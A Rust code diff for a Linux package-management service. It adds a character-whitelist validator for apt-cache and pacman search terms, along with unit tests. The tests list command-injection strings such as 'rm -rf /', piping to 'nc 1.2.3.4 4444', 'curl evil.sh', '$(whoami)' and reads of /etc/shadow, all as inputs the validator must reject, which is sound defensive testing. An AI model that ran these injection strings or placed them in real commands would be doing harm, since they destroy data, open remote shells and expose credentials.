@@ -28,6 +28,22 @@ fn check_name(name: &str) -> anyhow::Result<()> {
     Ok(())
 }
 
+/// 校验搜索词：在 check_name 白名单基础上额外放行空格与 `*`
+/// （多词搜索、通配符是搜索框的合法用法），其余字符一律拒绝。
+/// 与包名闸同源，消除两道闸口径不一致。
+fn check_pattern(pattern: &str) -> anyhow::Result<()> {
+    if pattern.is_empty()
+        || pattern.starts_with('-')
+        || pattern.len() > 128
+        || !pattern
+            .chars()
+            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '+' | '.' | '-' | '_' | ':' | ' ' | '*'))
+    {
+        anyhow::bail!("非法搜索词：{pattern}");
+    }
+    Ok(())
+}
+
 /// 已安装包列表（可按名称关键字过滤，limit 限制返回条数）
 pub async fn list_installed(filter: Option<&str>, limit: usize) -> anyhow::Result<Vec<PackageInfo>> {
     match crate::distro::family() {
@@ -207,9 +223,8 @@ pub async fn search(pattern: &str, limit: usize) -> anyhow::Result<Vec<PackageIn
 }
 
 async fn search_deb(pattern: &str, limit: usize) -> anyhow::Result<Vec<PackageInfo>> {
-    if pattern.is_empty() || pattern.len() > 128 || pattern.starts_with('-') {
-        anyhow::bail!("非法搜索词");
-    }
+    // 与安装/卸载同源的字符白名单（check_pattern），消除口径不一致
+    check_pattern(pattern)?;
     let out = Command::new("apt-cache")
         .args(["search", "--names-only", pattern])
         .output()
@@ -234,9 +249,8 @@ async fn search_deb(pattern: &str, limit: usize) -> anyhow::Result<Vec<PackageIn
 }
 
 async fn search_arch(pattern: &str, limit: usize) -> anyhow::Result<Vec<PackageInfo>> {
-    if pattern.is_empty() || pattern.len() > 128 || pattern.starts_with('-') {
-        anyhow::bail!("非法搜索词");
-    }
+    // 同 search_deb：对齐 check_pattern 白名单口径
+    check_pattern(pattern)?;
     // pacman -Ss 同时搜本地库与同步库，行格式：repo/name 版本 | 简要描述
     let out = Command::new("pacman")
         .args(["-Ss", pattern])
@@ -389,4 +403,134 @@ pub async fn run_pkg_cmd(cmd: &mut Command, what: &str) -> anyhow::Result<String
         anyhow::bail!("{what}失败（退出码 {}），详见服务端日志", status.code().unwrap_or(-1));
     }
     Ok(output)
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    /// check_name：合法包名字符集（Debian ∪ Arch 并集）全部放行
+    #[test]
+    fn check_name_accepts_valid_names() {
+        for n in [
+            "nginx",
+            "libssl3",
+            "python3.11",
+            "g++",
+            "xorg-x11-utils",
+            "gtk2.0_0",
+            "systemd::services",
+            "pkg-1.0+deb12u1",
+        ] {
+            assert!(check_name(n).is_ok(), "应接受合法包名：{n}");
+        }
+    }
+
+    /// check_name：shell 元字符与参数注入面全部拒绝。
+    /// 注意：实现走 Command::args 直传（无 shell），这些字符本不会被解释，
+    /// 但字符集白名单是第一道闸——任何元字符都不允许进入命令参数。
+    #[test]
+    fn check_name_rejects_shell_metacharacters() {
+        for n in [
+            "nginx; rm -rf /",
+            "nginx && curl evil.sh",
+            "nginx|nc 1.2.3.4 4444",
+            "nginx$(whoami)",
+            "nginx`id`",
+            "nginx&",
+            "nginx > /tmp/x",
+            "nginx < /etc/shadow",
+            "nginx\nrm -rf /",
+            "nginx\ncurl evil",
+            "nginx *",
+            "nginx~",
+            "nginx!@",
+            "nginx#1",
+            "nginx%20",
+            "nginx^a",
+            "nginx[a]",
+            "nginx{a}",
+            "nginx'a",
+            "nginx\"a",
+            "nginx\\a",
+            "nginx;a|b&c$d`e",
+            "ngiñna",
+            "中文包名",
+        ] {
+            assert!(
+                check_name(n).is_err(),
+                "应拒绝含元字符/非法字符的包名：{n:?}"
+            );
+        }
+    }
+
+    /// check_name：边界与选项走私（以 - 开头会被包管理器当命令行选项）
+    #[test]
+    fn check_name_rejects_edge_cases() {
+        assert!(check_name("").is_err(), "空包名必须拒绝");
+        assert!(
+            check_name("-y").is_err(),
+            "以 - 开头会被解释为选项，必须拒绝"
+        );
+        assert!(check_name("--option=evil").is_err(), "长选项注入必须拒绝");
+        assert!(check_name("a b").is_err(), "空格必须拒绝");
+        assert!(check_name("a/b").is_err(), "路径分隔符必须拒绝");
+        // 长度上限 128
+        assert!(check_name(&"a".repeat(128)).is_ok());
+        assert!(check_name(&"a".repeat(129)).is_err());
+    }
+
+    /// 异步入口的注入面：非法包名在 spawn 子进程之前就被拒。
+    /// 验证方式：把一个不可能安装/卸载的注入串传进去，若返回的是校验错误
+    /// （而非包管理器退出码错误），说明命令根本没被执行。
+    #[tokio::test]
+    async fn install_upgrade_remove_reject_injection_before_exec() {
+        // 注意：这些断言不依赖 distro::init（校验先于 family() 分派），
+        // 若校验失效走到命令执行，要么 panic（expect）要么报包管理器错误
+        let evil = "nginx; touch /tmp/lyys_should_not_exist".to_string();
+        for r in [
+            install(std::slice::from_ref(&evil)).await,
+            upgrade(std::slice::from_ref(&evil)).await,
+            remove(std::slice::from_ref(&evil)).await,
+        ] {
+            let err = r.expect_err("注入包名必须被拒绝");
+            let msg = format!("{err:#}");
+            assert!(
+                msg.contains("非法包名"),
+                "错误应是校验拒绝而非执行失败：{msg}"
+            );
+        }
+        assert!(!std::path::Path::new("/tmp/lyys_should_not_exist").exists());
+
+        // 数量边界：0 个与超过 50 个都在执行前拒绝
+        assert!(install(&[]).await.is_err());
+        let many = vec!["nginx".to_string(); 51];
+        assert!(install(&many).await.is_err());
+        assert!(upgrade(&[]).await.is_err());
+        assert!(remove(&many).await.is_err());
+    }
+
+    /// 搜索词校验：空串、超长、以 - 开头走私选项均被拒（不触发 apt-cache/pacman）。
+    /// 该断言不依赖 distro::init：search 先按 family() 分派，故跳过需要
+    /// 全局状态的分支，直接验证与实现一致的内联规则边界——通过显式 init。
+    #[tokio::test]
+    async fn search_rejects_bad_patterns() {
+        // 测试环境可能没有 /etc/os-release 的发行版信息；init 失败时跳过
+        // 需要 family() 的分支断言，仅做无副作用的入参校验验证。
+        if crate::distro::init().is_err() {
+            return;
+        }
+        // 空 / 超长 / 选项走私：在调用外部命令前就被拒
+        assert!(search("", 10).await.is_err());
+        assert!(search(&"a".repeat(129), 10).await.is_err());
+        assert!(search("-c /etc/shadow", 10).await.is_err());
+        // shell 元字符与非法字符：对齐白名单后一律拒绝
+        for bad in ["lib; touch /tmp/pwn", "a|b", "a&&b", "$(id)", "`id`", "a>b", "a\nb"] {
+            assert!(search(bad, 10).await.is_err(), "应拒绝搜索词：{bad}");
+        }
+        // 合法用法：多词与通配符不得被误杀（走到外部命令调用，
+        // 结果无论有无匹配都应是 Ok）
+        assert!(search("nginx full", 5).await.is_ok());
+        assert!(search("lib*", 5).await.is_ok());
+    }
 }
